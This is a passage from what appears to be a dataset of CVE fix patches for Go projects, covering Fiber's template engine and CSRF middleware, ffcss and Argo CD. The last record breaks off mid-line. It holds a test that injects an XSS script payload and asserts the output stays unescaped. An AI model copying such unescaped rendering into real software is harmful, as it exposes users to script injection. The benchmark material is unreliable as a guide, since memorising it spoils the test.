os.RemoveAll(dir)\n+require.NoError(t, err)\n+}()\n+\n+// Create a temporary template file.\n+err = os.WriteFile(dir+\"/xss.django\", []byte(\"<h1>{{ Name }}</h1>\"), 0o600)\n+require.NoError(t, err)\n+\n+engine := New(dir, \".django\")\n+\n+require.NoError(t, engine.Load())\n+\n+var buf bytes.Buffer\n+err = engine.Render(&buf, \"xss\", fiber.Map{\n+\"Name\": \"<script>alert('XSS')</script>\",\n+})\n+require.NoError(t, err)\n+\n+// The output should be unescaped, demonstrating the vulnerability\n+expect := \"<h1><script>alert('XSS')</script></h1>\"\n+result := trim(buf.String())\n+require.Equal(t, expect, result)\n+}\n"}
{"cve":"CVE-2023-52081:0708", "fix_patch": "diff --git a/catalog.go b/catalog.go\nindex 1fb4814..2a15dff 100644\n--- a/catalog.go\n+++ b/catalog.go\n@@ -1,14 +1,14 @@\n package ffcss\n \n import (\n-\t\"fmt\"\n-\t\"os\"\n-\t\"path/filepath\"\n-\t\"regexp\"\n-\t\"strings\"\n+        \"fmt\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"regexp\"\n+        \"strings\"\n \n-\t\"github.com/hbollon/go-edlib\"\n-\t\"golang.org/x/text/unicode/norm\"\n+        \"github.com/hbollon/go-edlib\"\n+        \"golang.org/x/text/unicode/norm\"\n )\n \n // Catalog represents a collection of themes\n@@ -18,60 +18,60 @@ type Catalog map[string]Theme\n // It also returns an error starting with \"did you mean:\" when\n // a theme name is not found but themes with similar names exist.\n func (store Catalog) Lookup(query string) (Theme, error) {\n-\toriginalQuery := query\n-\tquery = lookupPreprocess(query)\n-\tLogDebug(\"using query %q\", query)\n-\tprocessedThemeNames := make([]string, 0, len(store))\n-\tfor _, theme := range store {\n-\t\tLogDebug(\"\\tlooking up against %q (%q)\", lookupPreprocess(theme.Name()), theme.Name())\n-\t\tif lookupPreprocess(theme.Name()) == query {\n-\t\t\treturn theme, nil\n-\t\t}\n-\t\tprocessedThemeNames = append(processedThemeNames, lookupPreprocess(theme.Name()))\n-\t}\n-\t// Use fuzzy search for did-you-mean errors\n-\tsuggestion, _ := edlib.FuzzySearchThreshold(query, processedThemeNames, 0.75, edlib.Levenshtein)\n+        originalQuery := query\n+        query = lookupPreprocess(query)\n+        LogDebug(\"using query %q\", query)\n+        processedThemeNames := make([]string, 0, len(store))\n+        for _, theme := range store {\n+                LogDebug(\"\\tlooking up against %q (%q)\", lookupPreprocess(theme.Name()), theme.Name())\n+                if lookupPreprocess(theme.Name()) == query {\n+                        return theme, nil\n+                }\n+                processedThemeNames = append(processedThemeNames, lookupPreprocess(theme.Name()))\n+        }\n+        // Use fuzzy search for did-you-mean errors\n+        suggestion, _ := edlib.FuzzySearchThreshold(query, processedThemeNames, 0.75, edlib.Levenshtein)\n \n-\tif suggestion != \"\" {\n-\t\treturn Theme{}, fmt.Errorf(\"theme %q not found. did you mean [blue][bold]%s[reset]?\", originalQuery, suggestion)\n-\t}\n-\treturn Theme{}, fmt.Errorf(\"theme %q not found\", originalQuery)\n+        if suggestion != \"\" {\n+                return Theme{}, fmt.Errorf(\"theme %q not found. did you mean [blue][bold]%s[reset]?\", originalQuery, suggestion)\n+        }\n+        return Theme{}, fmt.Errorf(\"theme %q not found\", originalQuery)\n }\n \n // lookupPreprocess applies transformations to s so that it can be compared\n // to search for something.\n // For example, it is used by (ThemeStore).Lookup\n func lookupPreprocess(s string) string {\n-\treturn strings.ToLower(norm.NFKD.String(regexp.MustCompile(`[-_ .]`).ReplaceAllString(s, \"\")))\n+        return regexp.MustCompile(`[-_ .]`).ReplaceAllString(strings.ToLower(norm.NFKD.String(s)), \"\")\n }\n \n // LoadCatalog loads a directory of theme manifests.\n // Keys are theme names (files' basenames with the .yaml removed).\n func LoadCatalog(storeDirectory string) (themes Catalog, err error) {\n-\tthemeNamePattern := regexp.MustCompile(`^(.+)\\.ya?ml$`)\n-\tthemes = make(Catalog)\n-\tmanifests, err := os.ReadDir(storeDirectory)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\tLogDebug(\"loading potential themes %v into catalog\", func() []string {\n-\t\tdirNames := make([]string, 0, len(manifests))\n-\t\tfor _, dir := range manifests {\n-\t\t\tdirNames = append(dirNames, dir.Name())\n-\t\t}\n-\t\treturn dirNames\n-\t}())\n-\tfor _, manifest := range manifests {\n-\t\tif !themeNamePattern.MatchString(manifest.Name()) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tthemeName := themeNamePattern.FindStringSubmatch(manifest.Name())[1]\n-\t\ttheme, err := LoadManifest(filepath.Join(storeDirectory, manifest.Name()))\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"while loading theme %q: %w\", themeName, err)\n-\t\t}\n-\t\tLogDebug(\"\\tadding theme from manifest %q\", manifest.Name())\n-\t\tthemes[themeName] = theme\n-\t}\n-\treturn\n+        themeNamePattern := regexp.MustCompile(`^(.+)\\.ya?ml$`)\n+        themes = make(Catalog)\n+        manifests, err := os.ReadDir(storeDirectory)\n+        if err != nil {\n+                return\n+        }\n+        LogDebug(\"loading potential themes %v into catalog\", func() []string {\n+                dirNames := make([]string, 0, len(manifests))\n+                for _, dir := range manifests {\n+                        dirNames = append(dirNames, dir.Name())\n+                }\n+                return dirNames\n+        }())\n+        for _, manifest := range manifests {\n+                if !themeNamePattern.MatchString(manifest.Name()) {\n+                        continue\n+                }\n+                themeName := themeNamePattern.FindStringSubmatch(manifest.Name())[1]\n+                theme, err := LoadManifest(filepath.Join(storeDirectory, manifest.Name()))\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"while loading theme %q: %w\", themeName, err)\n+                }\n+                LogDebug(\"\\tadding theme from manifest %q\", manifest.Name())\n+                themes[themeName] = theme\n+        }\n+        return\n }\n"}
{"cve":"CVE-2023-45128:0708", "fix_patch": "diff --git a/middleware/csrf/csrf.go b/middleware/csrf/csrf.go\nindex b7b01274..70e1adb0 100644\n--- a/middleware/csrf/csrf.go\n+++ b/middleware/csrf/csrf.go\n@@ -1,230 +1,232 @@\n package csrf\n \n import (\n-\t\"errors\"\n-\t\"reflect\"\n-\t\"time\"\n+        \"errors\"\n+        \"reflect\"\n+        \"time\"\n \n-\t\"github.com/gofiber/fiber/v2\"\n+        \"github.com/gofiber/fiber/v2\"\n )\n \n var (\n-\tErrTokenNotFound = errors.New(\"csrf token not found\")\n-\tErrTokenInvalid  = errors.New(\"csrf token invalid\")\n-\tErrNoReferer     = errors.New(\"referer not supplied\")\n-\tErrBadReferer    = errors.New(\"referer invalid\")\n-\tdummyValue       = []byte{'+'}\n+        ErrTokenNotFound = errors.New(\"csrf token not found\")\n+        ErrTokenInvalid  = errors.New(\"csrf token invalid\")\n+        ErrNoReferer     = errors.New(\"referer not supplied\")\n+        ErrBadReferer    = errors.New(\"referer invalid\")\n+        dummyValue       = []byte{'+'}\n )\n \n type CSRFHandler struct {\n-\tconfig         *Config\n-\tsessionManager *sessionManager\n-\tstorageManager *storageManager\n+        config         *Config\n+        sessionManager *sessionManager\n+        storageManager *storageManager\n }\n \n // New creates a new middleware handler\n func New(config ...Config) fiber.Handler {\n-\t// Set default config\n-\tcfg := configDefault(config...)\n-\n-\t// Create manager to simplify storage operations ( see *_manager.go )\n-\tvar sessionManager *sessionManager\n-\tvar storageManager *storageManager\n-\tif cfg.Session != nil {\n-\t\t// Register the Token struct in the session store\n-\t\tcfg.Session.RegisterType(Token{})\n-\n-\t\tsessionManager = newSessionManager(cfg.Session, cfg.SessionKey)\n-\t} else {\n-\t\tstorageManager = newStorageManager(cfg.Storage)\n-\t}\n-\n-\t// Return new handler\n-\treturn func(c *fiber.Ctx) error {\n-\t\t// Don't execute middleware if Next returns true\n-\t\tif cfg.Next != nil && cfg.Next(c) {\n-\t\t\treturn c.Next()\n-\t\t}\n-\n-\t\t// Store the CSRF handler in the context if a context key is specified\n-\t\tif cfg.HandlerContextKey != \"\" {\n-\t\t\tc.Locals(cfg.HandlerContextKey, &CSRFHandler{\n-\t\t\t\tconfig:         &cfg,\n-\t\t\t\tsessionManager: sessionManager,\n-\t\t\t\tstorageManager: storageManager,\n-\t\t\t})\n-\t\t}\n-\n-\t\tvar token string\n-\n-\t\t// Action depends on the HTTP method\n-\t\tswitch c.Method() {\n-\t\tcase fiber.MethodGet, fiber.MethodHead, fiber.MethodOptions, fiber.MethodTrace:\n-\t\t\tcookieToken := c.Cookies(cfg.CookieName)\n-\n-\t\t\tif cookieToken != \"\" {\n-\t\t\t\trawToken := getTokenFromStorage(c, cookieToken, cfg, sessionManager, storageManager)\n-\n-\t\t\t\tif rawToken != nil {\n-\t\t\t\t\ttoken = string(rawToken)\n-\t\t\t\t}\n-\t\t\t}\n-\t\tdefault:\n-\t\t\t// Assume that anything not defined as 'safe' by RFC7231 needs protection\n-\n-\t\t\t// Enforce an origin check for HTTPS connections.\n-\t\t\tif c.Protocol() == \"https\" {\n-\t\t\t\tif err := refererMatchesHost(c); err != nil {\n-\t\t\t\t\treturn cfg.ErrorHandler(c, err)\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\t// Extract token from client request i.e. header, query, param, form or cookie\n-\t\t\textractedToken, err := cfg.Extractor(c)\n-\t\t\tif err != nil {\n-\t\t\t\treturn cfg.ErrorHandler(c, err)\n-\t\t\t}\n-\n-\t\t\tif extractedToken == \"\" {\n-\t\t\t\treturn cfg.ErrorHandler(c, ErrTokenNotFound)\n-\t\t\t}\n-\n-\t\t\t// If not using CsrfFromCookie extractor, check that the token matches the cookie\n-\t\t\t// This is to prevent CSRF attacks by using a Double Submit Cookie method\n-\t\t\t// Useful when we do not have access to the users Session\n-\t\t\tif !isCsrfFromCookie(cfg.Extractor) && extractedToken != c.Cookies(cfg.CookieName) {\n-\t\t\t\treturn cfg.ErrorHandler(c, ErrTokenInvalid)\n-\t\t\t}\n-\n-\t\t\trawToken := getTokenFromStorage(c, extractedToken, cfg, sessionManager, storageManager)\n-\n-\t\t\tif rawToken == nil {\n-\t\t\t\t// If token is not in storage, expire the cookie\n-\t\t\t\texpireCSRFCookie(c, cfg)\n-\t\t\t\t// and return an error\n-\t\t\t\treturn cfg.ErrorHandler(c, ErrTokenNotFound)\n-\t\t\t}\n-\t\t\tif cfg.SingleUseToken {\n-\t\t\t\t// If token is single use, delete it from storage\n-\t\t\t\tdeleteTokenFromStorage(c, extractedToken, cfg, sessionManager, storageManager)\n-\t\t\t} else {\n-\t\t\t\ttoken = string(rawToken)\n-\t\t\t}\n-\t\t}\n-\n-\t\t// Generate CSRF token if not exist\n-\t\tif token == \"\" {\n-\t\t\t// And generate a new token\n-\t\t\ttoken = cfg.KeyGenerator()\n-\t\t}\n-\n-\t\t// Create or extend the token in the storage\n-\t\tcreateOrExtendTokenInStorage(c, token, cfg, sessionManager, storageManager)\n-\n-\t\t// Update the CSRF cookie\n-\t\tupdateCSRFCookie(c, cfg, token)\n-\n-\t\t// Tell the browser that a new header value is generated\n-\t\tc.Vary(fiber.HeaderCookie)\n-\n-\t\t// Store the token in the context if a context key is specified\n-\t\tif cfg.ContextKey != \"\" {\n-\t\t\tc.Locals(cfg.ContextKey, token)\n-\t\t}\n-\n-\t\t// Continue stack\n-\t\treturn c.Next()\n-\t}\n+        // Set default config\n+        cfg := configDefault(config...)\n+\n+        // Create manager to simplify storage operations ( see *_manager.go )\n+        var sessionManager *sessionManager\n+        var storageManager *storageManager\n+        if cfg.Session != nil {\n+                // Register the Token struct in the session store\n+                cfg.Session.RegisterType(Token{})\n+\n+                sessionManager = newSessionManager(cfg.Session, cfg.SessionKey)\n+        } else {\n+                storageManager = newStorageManager(cfg.Storage)\n+        }\n+\n+        // Return new handler\n+        return func(c *fiber.Ctx) error {\n+                // Don't execute middleware if Next returns true\n+                if cfg.Next != nil && cfg.Next(c) {\n+                        return c.Next()\n+                }\n+\n+                // Store the CSRF handler in the context if a context key is specified\n+                if cfg.HandlerContextKey != \"\" {\n+                        c.Locals(cfg.HandlerContextKey, &CSRFHandler{\n+                                config:         &cfg,\n+                                sessionManager: sessionManager,\n+                                storageManager: storageManager,\n+                        })\n+                }\n+\n+                var token string\n+\n+                // Action depends on the HTTP method\n+                switch c.Method() {\n+                case fiber.MethodGet, fiber.MethodHead, fiber.MethodOptions, fiber.MethodTrace:\n+                        cookieToken := c.Cookies(cfg.CookieName)\n+\n+                        if cookieToken != \"\" {\n+                                rawToken := getTokenFromStorage(c, cookieToken, cfg, sessionManager, storageManager)\n+\n+                                if rawToken != nil {\n+                                        token = string(rawToken)\n+                                }\n+                        }\n+                default:\n+                        // Assume that anything not defined as 'safe' by RFC7231 needs protection\n+\n+                        // Enforce an origin check for HTTPS connections.\n+                        if c.Protocol() == \"https\" {\n+                                if err := refererMatchesHost(c); err != nil {\n+                                        return cfg.ErrorHandler(c, err)\n+                                }\n+                        }\n+\n+                        // Extract token from client request i.e. header, query, param, form or cookie\n+                        extractedToken, err := cfg.Extractor(c)\n+                        if err != nil {\n+                                return cfg.ErrorHandler(c, err)\n+                        }\n+\n+                        if extractedToken == \"\" {\n+                                return cfg.ErrorHandler(c, ErrTokenNotFound)\n+                        }\n+\n+                        // If not using CsrfFromCookie extractor, check that the token matches the cookie\n+                        // This is to prevent CSRF attacks by using a Double Submit Cookie method\n+                        // Useful when we do not have access to the users Session\n+                        cookieToken := c.Cookies(cfg.CookieName)\n+                        if !isCsrfFromCookie(cfg.Extractor) && extractedToken != cookieToken {\n+                                return cfg.ErrorHandler(c, ErrTokenInvalid)\n+                        }\n+\n+                        // Check that the token is valid, and not expired\n+                        rawToken := getTokenFromStorage(c, cookieToken, cfg, sessionManager, storageManager)\n+\n+                        if rawToken == nil {\n+                                // If token is not in storage, expire the cookie\n+                                expireCSRFCookie(c, cfg)\n+                                // and return an error\n+                                return cfg.ErrorHandler(c, ErrTokenNotFound)\n+                        }\n+                        if cfg.SingleUseToken {\n+                                // If token is single use, delete it from storage\n+                                deleteTokenFromStorage(c, extractedToken, cfg, sessionManager, storageManager)\n+                        } else {\n+                                token = string(rawToken)\n+                        }\n+                }\n+\n+                // Generate CSRF token if not exist\n+                if token == \"\" {\n+                        // And generate a new token\n+                        token = cfg.KeyGenerator()\n+                }\n+\n+                // Create or extend the token in the storage\n+                createOrExtendTokenInStorage(c, token, cfg, sessionManager, storageManager)\n+\n+                // Update the CSRF cookie\n+                updateCSRFCookie(c, cfg, token)\n+\n+                // Tell the browser that a new header value is generated\n+                c.Vary(fiber.HeaderCookie)\n+\n+                // Store the token in the context if a context key is specified\n+                if cfg.ContextKey != \"\" {\n+                        c.Locals(cfg.ContextKey, token)\n+                }\n+\n+                // Continue stack\n+                return c.Next()\n+        }\n }\n \n // getTokenFromStorage returns the raw token from the storage\n // returns nil if the token does not exist, is expired or is invalid\n func getTokenFromStorage(c *fiber.Ctx, token string, cfg Config, sessionManager *sessionManager, storageManager *storageManager) []byte {\n-\tif cfg.Session != nil {\n-\t\treturn sessionManager.getRaw(c, token, dummyValue)\n-\t}\n-\treturn storageManager.getRaw(token)\n+        if cfg.Session != nil {\n+                return sessionManager.getRaw(c, token, dummyValue)\n+        }\n+        return storageManager.getRaw(token)\n }\n \n // createOrExtendTokenInStorage creates or extends the token in the storage\n func createOrExtendTokenInStorage(c *fiber.Ctx, token string, cfg Config, sessionManager *sessionManager, storageManager *storageManager) {\n-\tif cfg.Session != nil {\n-\t\tsessionManager.setRaw(c, token, dummyValue, cfg.Expiration)\n-\t} else {\n-\t\tstorageManager.setRaw(token, dummyValue, cfg.Expiration)\n-\t}\n+        if cfg.Session != nil {\n+                sessionManager.setRaw(c, token, dummyValue, cfg.Expiration)\n+        } else {\n+                storageManager.setRaw(token, dummyValue, cfg.Expiration)\n+        }\n }\n \n func deleteTokenFromStorage(c *fiber.Ctx, token string, cfg Config, sessionManager *sessionManager, storageManager *storageManager) {\n-\tif cfg.Session != nil {\n-\t\tsessionManager.delRaw(c)\n-\t} else {\n-\t\tstorageManager.delRaw(token)\n-\t}\n+        if cfg.Session != nil {\n+                sessionManager.delRaw(c)\n+        } else {\n+                storageManager.delRaw(token)\n+        }\n }\n \n // Update CSRF cookie\n // if expireCookie is true, the cookie will expire immediately\n func updateCSRFCookie(c *fiber.Ctx, cfg Config, token string) {\n-\tsetCSRFCookie(c, cfg, token, cfg.Expiration)\n+        setCSRFCookie(c, cfg, token, cfg.Expiration)\n }\n \n func expireCSRFCookie(c *fiber.Ctx, cfg Config) {\n-\tsetCSRFCookie(c, cfg, \"\", -time.Hour)\n+        setCSRFCookie(c, cfg, \"\", -time.Hour)\n }\n \n func setCSRFCookie(c *fiber.Ctx, cfg Config, token string, expiry time.Duration) {\n-\tcookie := &fiber.Cookie{\n-\t\tName:        cfg.CookieName,\n-\t\tValue:       token,\n-\t\tDomain:      cfg.CookieDomain,\n-\t\tPath:        cfg.CookiePath,\n-\t\tSecure:      cfg.CookieSecure,\n-\t\tHTTPOnly:    cfg.CookieHTTPOnly,\n-\t\tSameSite:    cfg.CookieSameSite,\n-\t\tSessionOnly: cfg.CookieSessionOnly,\n-\t\tExpires:     time.Now().Add(expiry),\n-\t}\n-\n-\t// Set the CSRF cookie to the response\n-\tc.Cookie(cookie)\n+        cookie := &fiber.Cookie{\n+                Name:        cfg.CookieName,\n+                Value:       token,\n+                Domain:      cfg.CookieDomain,\n+                Path:        cfg.CookiePath,\n+                Secure:      cfg.CookieSecure,\n+                HTTPOnly:    cfg.CookieHTTPOnly,\n+                SameSite:    cfg.CookieSameSite,\n+                SessionOnly: cfg.CookieSessionOnly,\n+                Expires:     time.Now().Add(expiry),\n+        }\n+\n+        // Set the CSRF cookie to the response\n+        c.Cookie(cookie)\n }\n \n // DeleteToken removes the token found in the context from the storage\n // and expires the CSRF cookie\n func (handler *CSRFHandler) DeleteToken(c *fiber.Ctx) error {\n-\t// Get the config from the context\n-\tconfig := handler.config\n-\tif config == nil {\n-\t\tpanic(\"CSRFHandler config not found in context\")\n-\t}\n-\t// Extract token from the client request cookie\n-\tcookieToken := c.Cookies(config.CookieName)\n-\tif cookieToken == \"\" {\n-\t\treturn config.ErrorHandler(c, ErrTokenNotFound)\n-\t}\n-\t// Remove the token from storage\n-\tdeleteTokenFromStorage(c, cookieToken, *config, handler.sessionManager, handler.storageManager)\n-\t// Expire the cookie\n-\texpireCSRFCookie(c, *config)\n-\treturn nil\n+        // Get the config from the context\n+        config := handler.config\n+        if config == nil {\n+                panic(\"CSRFHandler config not found in context\")\n+        }\n+        // Extract token from the client request cookie\n+        cookieToken := c.Cookies(config.CookieName)\n+        if cookieToken == \"\" {\n+                return config.ErrorHandler(c, ErrTokenNotFound)\n+        }\n+        // Remove the token from storage\n+        deleteTokenFromStorage(c, cookieToken, *config, handler.sessionManager, handler.storageManager)\n+        // Expire the cookie\n+        expireCSRFCookie(c, *config)\n+        return nil\n }\n \n // isCsrfFromCookie checks if the extractor is set to ExtractFromCookie\n func isCsrfFromCookie(extractor interface{}) bool {\n-\treturn reflect.ValueOf(extractor).Pointer() == reflect.ValueOf(CsrfFromCookie).Pointer()\n+        return reflect.ValueOf(extractor).Pointer() == reflect.ValueOf(CsrfFromCookie).Pointer()\n }\n \n // refererMatchesHost checks that the referer header matches the host header\n // returns an error if the referer header is not present or is invalid\n // returns nil if the referer header is valid\n func refererMatchesHost(c *fiber.Ctx) error {\n-\treferer := c.Get(fiber.HeaderReferer)\n-\tif referer == \"\" {\n-\t\treturn ErrNoReferer\n-\t}\n-\tif referer != c.Protocol()+\"://\"+c.Hostname() {\n-\t\treturn ErrBadReferer\n-\t}\n-\treturn nil\n+        referer := c.Get(fiber.HeaderReferer)\n+        if referer == \"\" {\n+                return ErrNoReferer\n+        }\n+        if referer != c.Protocol()+\"://\"+c.Hostname() {\n+                return ErrBadReferer\n+        }\n+        return nil\n }\n"}
{"cve":"CVE-2023-40029:0708", "fix_patch": "diff --git a/util/db/cluster.go b/util/db/cluster.go\nindex 9b405a9cac..c42d752907 100644\n--- a/util/db/cluster.go\n+++ b/util/db/cluster.go\n@@ -1,423 +1,520 @@\n package db\n \n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"time\"\n-\n-\tlog \"github.com/sirupsen/logrus\"\n-\t\"google.golang.org/grpc/codes\"\n-\t\"google.golang.org/grpc/status\"\n-\tapiv1 \"k8s.io/api/core/v1\"\n-\tapierr \"k8s.io/apimachinery/pkg/api/errors\"\n-\tmetav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n-\t\"k8s.io/apimachinery/pkg/watch\"\n-\t\"k8s.io/utils/pointer\"\n-\n-\t\"github.com/argoproj/argo-cd/v2/common\"\n-\tappv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n-\t\"github.com/argoproj/argo-cd/v2/util/collections\"\n-\t\"github.com/argoproj/argo-cd/v2/util/settings\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+        \"time\"\n+\n+        log \"github.com/sirupsen/logrus\"\n+        \"google.golang.org/grpc/codes\"\n+        \"google.golang.org/grpc/status\"\n+        apiv1 \"k8s.io/api/core/v1\"\n+        apierr \"k8s.io/apimachinery/pkg/api/errors\"\n+        metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n+        \"k8s.io/apimachinery/pkg/watch\"\n+        \"k8s.io/utils/pointer\"\n+\n+        \"github.com/argoproj/argo-cd/v2/common\"\n+        appv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n+        \"github.com/argoproj/argo-cd/v2/util/collections\"\n+        \"github.com/argoproj/argo-cd/v2/util/settings\"\n )\n \n var (\n-\tlocalCluster = appv1.Cluster{\n-\t\tName:            \"in-cluster\",\n-\t\tServer:          appv1.KubernetesInternalAPIServerAddr,\n-\t\tConnectionState: appv1.ConnectionState{Status: appv1.ConnectionStatusSuccessful},\n-\t}\n-\tinitLocalCluster sync.Once\n+        localCluster = appv1.Cluster{\n+                Name:            \"in-cluster\",\n+                Server:          appv1.KubernetesInternalAPIServerAddr,\n+                ConnectionState: appv1.ConnectionState{Status: appv1.ConnectionStatusSuccessful},\n+        }\n+        initLocalCluster sync.Once\n )\n \n func (db *db) getLocalCluster() *appv1.Cluster {\n-\tinitLocalCluster.Do(func() {\n-\t\tinfo, err := db.kubeclientset.Discovery().ServerVersion()\n-\t\tif err == nil {\n-\t\t\tlocalCluster.ServerVersion = fmt.Sprintf(\"%s.%s\", info.Major, info.Minor)\n-\t\t\tlocalCluster.ConnectionState = appv1.ConnectionState{Status: appv1.ConnectionStatusSuccessful}\n-\t\t} else {\n-\t\t\tlocalCluster.ConnectionState = appv1.ConnectionState{\n-\t\t\t\tStatus:  appv1.ConnectionStatusFailed,\n-\t\t\t\tMessage: err.Error(),\n-\t\t\t}\n-\t\t}\n-\t})\n-\tcluster := localCluster.DeepCopy()\n-\tnow := metav1.Now()\n-\tcluster.ConnectionState.ModifiedAt = &now\n-\treturn cluster\n+        initLocalCluster.Do(func() {\n+                info, err := db.kubeclientset.Discovery().ServerVersion()\n+                if err == nil {\n+                        localCluster.ServerVersion = fmt.Sprintf(\"%s.%s\", info.Major, info.Minor)\n+                        localCluster.ConnectionState = appv1.ConnectionState{Status: appv1.ConnectionStatusSuccessful}\n+                } else {\n+                        localCluster.ConnectionState = appv1.ConnectionState{\n+                                Status:  appv1.ConnectionStatusFailed,\n+                                Message: err.Error(),\n+                        }\n+                }\n+        })\n+        cluster := localCluster.DeepCopy()\n+        now := metav1.Now()\n+        cluster.ConnectionState.ModifiedAt = &now\n+        return cluster\n }\n \n // ListClusters returns list of clusters\n func (db *db) ListClusters(ctx context.Context) (*appv1.ClusterList, error) {\n-\tclusterSecrets, err := db.listSecretsByType(common.LabelValueSecretTypeCluster)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tclusterList := appv1.ClusterList{\n-\t\tItems: make([]appv1.Cluster, 0),\n-\t}\n-\tsettings, err := db.settingsMgr.GetSettings()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tinClusterEnabled := settings.InClusterEnabled\n-\thasInClusterCredentials := false\n-\tfor _, clusterSecret := range clusterSecrets {\n-\t\tcluster, err := SecretToCluster(clusterSecret)\n-\t\tif err != nil {\n-\t\t\tlog.Errorf(\"could not unmarshal cluster secret %s\", clusterSecret.Name)\n-\t\t\tcontinue\n-\t\t}\n-\t\tif cluster.Server == appv1.KubernetesInternalAPIServerAddr {\n-\t\t\tif inClusterEnabled {\n-\t\t\t\thasInClusterCredentials = true\n-\t\t\t\tclusterList.Items = append(clusterList.Items, *cluster)\n-\t\t\t}\n-\t\t} else {\n-\t\t\tclusterList.Items = append(clusterList.Items, *cluster)\n-\t\t}\n-\t}\n-\tif inClusterEnabled && !hasInClusterCredentials {\n-\t\tclusterList.Items = append(clusterList.Items, *db.getLocalCluster())\n-\t}\n-\treturn &clusterList, nil\n+        clusterSecrets, err := db.listSecretsByType(common.LabelValueSecretTypeCluster)\n+        if err != nil {\n+                return nil, err\n+        }\n+        clusterList := appv1.ClusterList{\n+                Items: make([]appv1.Cluster, 0),\n+        }\n+        settings, err := db.settingsMgr.GetSettings()\n+        if err != nil {\n+                return nil, err\n+        }\n+        inClusterEnabled := settings.InClusterEnabled\n+        hasInClusterCredentials := false\n+        for _, clusterSecret := range clusterSecrets {\n+                cluster, err := SecretToCluster(clusterSecret)\n+                if err != nil {\n+                        log.Errorf(\"could not unmarshal cluster secret %s\", clusterSecret.Name)\n+                        continue\n+                }\n+                if cluster.Server == appv1.KubernetesInternalAPIServerAddr {\n+                        if inClusterEnabled {\n+                                hasInClusterCredentials = true\n+                                clusterList.Items = append(clusterList.Items, *cluster)\n+                        }\n+                } else {\n+                        clusterList.Items = append(clusterList.Items, *cluster)\n+                }\n+        }\n+        if inClusterEnabled && !hasInClusterCredentials {\n+                clusterList.Items = append(clusterList.Items, *db.getLocalCluster())\n+        }\n+        return &clusterList, nil\n }\n \n // CreateCluster creates a cluster\n func (db *db) CreateCluster(ctx context.Context, c *appv1.Cluster) (*appv1.Cluster, error) {\n-\tsettings, err := db.settingsMgr.GetSettings()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif c.Server == appv1.KubernetesInternalAPIServerAddr && !settings.InClusterEnabled {\n-\t\treturn nil, status.Errorf(codes.InvalidArgument, \"cannot register cluster: in-cluster has been disabled\")\n-\t}\n-\tsecName, err := URIToSecretName(\"cluster\", c.Server)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tclusterSecret := &apiv1.Secret{\n-\t\tObjectMeta: metav1.ObjectMeta{\n-\t\t\tName: secName,\n-\t\t},\n-\t}\n-\n-\tif err = clusterToSecret(c, clusterSecret); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tclusterSecret, err = db.createSecret(ctx, clusterSecret)\n-\tif err != nil {\n-\t\tif apierr.IsAlreadyExists(err) {\n-\t\t\treturn nil, status.Errorf(codes.AlreadyExists, \"cluster %q already exists\", c.Server)\n-\t\t}\n-\t\treturn nil, err\n-\t}\n-\n-\tcluster, err := SecretToCluster(clusterSecret)\n-\tif err != nil {\n-\t\treturn nil, status.Errorf(codes.InvalidArgument, \"could not unmarshal cluster secret %s\", clusterSecret.Name)\n-\t}\n-\treturn cluster, db.settingsMgr.ResyncInformers()\n+        settings, err := db.settingsMgr.GetSettings()\n+        if err != nil {\n+                return nil, err\n+        }\n+        if c.Server == appv1.KubernetesInternalAPIServerAddr && !settings.InClusterEnabled {\n+                return nil, status.Errorf(codes.InvalidArgument, \"cannot register cluster: in-cluster has been disabled\")\n+        }\n+        secName, err := URIToSecretName(\"cluster\", c.Server)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        clusterSecret := &apiv1.Secret{\n+                ObjectMeta: metav1.ObjectMeta{\n+                        Name: secName,\n+                },\n+        }\n+\n+        if err = clusterToSecret(c, clusterSecret); err != nil {\n+                return nil, err\n+        }\n+\n+        clusterSecret, err = db.createSecret(ctx, clusterSecret)\n+        if err != nil {\n+                if apierr.IsAlreadyExists(err) {\n+                        return nil, status.Errorf(codes.AlreadyExists, \"cluster %q already exists\", c.Server)\n+                }\n+                return nil, err\n+        }\n+\n+        cluster, err := SecretToCluster(clusterSecret)\n+        if err != nil {\n+                return nil, status.Errorf(codes.InvalidArgument, \"could not unmarshal cluster secret %s\", clusterSecret.Name)\n+        }\n+        return cluster, db.settingsMgr.ResyncInformers()\n }\n \n // ClusterEvent contains information about cluster event\n type ClusterEvent struct {\n-\tType    watch.EventType\n-\tCluster *appv1.Cluster\n+        Type    watch.EventType\n+        Cluster *appv1.Cluster\n }\n \n func (db *db) WatchClusters(ctx context.Context,\n-\thandleAddEvent func(cluster *appv1.Cluster),\n-\thandleModEvent func(oldCluster *appv1.Cluster, newCluster *appv1.Cluster),\n-\thandleDeleteEvent func(clusterServer string)) error {\n-\tlocalCls, err := db.GetCluster(ctx, appv1.KubernetesInternalAPIServerAddr)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\thandleAddEvent(localCls)\n-\n-\tdb.watchSecrets(\n-\t\tctx,\n-\t\tcommon.LabelValueSecretTypeCluster,\n-\n-\t\tfunc(secret *apiv1.Secret) {\n-\t\t\tcluster, err := SecretToCluster(secret)\n-\t\t\tif err != nil {\n-\t\t\t\tlog.Errorf(\"could not unmarshal cluster secret %s\", secret.Name)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif cluster.Server == appv1.KubernetesInternalAPIServerAddr {\n-\t\t\t\t// change local cluster event to modified or deleted, since it cannot be re-added or 